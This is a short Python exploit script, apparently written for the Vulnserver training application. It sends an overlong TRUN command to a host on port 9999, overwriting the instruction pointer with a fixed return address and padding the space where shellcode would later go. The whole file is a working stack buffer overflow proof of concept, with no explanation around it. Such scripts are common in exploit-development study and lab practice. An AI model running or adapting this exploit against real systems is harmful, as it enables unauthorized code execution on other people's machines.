import socket
import struct

length = 2992

try: 

    offset = 2003
    new_eip = struct.pack("<I", 0x62501203)

    s = socket.socket()
    s.connect( ("192.168.168.11", 9999) )

    payload = [
        b"TRUN /.:/",
        b"A" * offset,
        new_eip,
        b"C" * 976
    ]

    payload = b"".join(payload)

    s.send(payload)
    s.close()
    
except:
    print("Could not connect to the target server")
    sys.exit(1)    
